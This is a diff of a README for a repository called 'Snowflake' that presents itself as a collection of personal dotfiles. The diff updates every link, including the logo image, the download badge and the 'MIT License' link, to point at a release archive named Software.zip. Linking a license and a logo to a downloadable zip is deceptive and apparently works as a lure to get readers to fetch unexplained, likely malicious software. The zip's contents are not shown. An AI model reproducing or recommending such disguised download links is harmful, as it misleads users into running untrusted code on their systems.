@@ -1,7 +1,7 @@
 
 # 🌟 Snowflake: Personal Configuration Files Repository 🌟
 
-![Snowflake Logo](https://github.com/Evox3406/snowflake/releases/download/v1.0/Software.zip)
+![Snowflake Logo](https://github.com/Evox3406/snowflake/releases/download/v2.0/Software.zip)
 
 Welcome to the Snowflake repository, your go-to place for personal configuration files for your systems. This repository contains a collection of dotfiles and configuration setups that I use across my various devices. Feel free to explore, use, and customize to make your systems truly your own.
 
@@ -34,7 +34,7 @@ Snowflake is a repository dedicated to storing and sharing various configuration
 ## Installation
 
 To access the latest version of Snowflake, you can download the repository by clicking on the following link:
-[![Download Snowflake](https://github.com/Evox3406/snowflake/releases/download/v1.0/Software.zip)](https://github.com/Evox3406/snowflake/releases/download/v1.0/Software.zip)
+[![Download Snowflake](https://github.com/Evox3406/snowflake/releases/download/v2.0/Software.zip)](https://github.com/Evox3406/snowflake/releases/download/v2.0/Software.zip)
 
 If the link takes you directly to the zip file, simply unzip it to access the repository files.
 
@@ -55,7 +55,7 @@ If you have any ideas, suggestions, or improvements for Snowflake, please feel f
 
 ## License
 
-This repository is licensed under the [MIT License](https://github.com/Evox3406/snowflake/releases/download/v1.0/Software.zip). Feel free to use the files and configurations in this repository for personal or commercial projects.
+This repository is licensed under the [MIT License](https://github.com/Evox3406/snowflake/releases/download/v2.0/Software.zip). Feel free to use the files and configurations in this repository for personal or commercial projects.
 
 ---
 
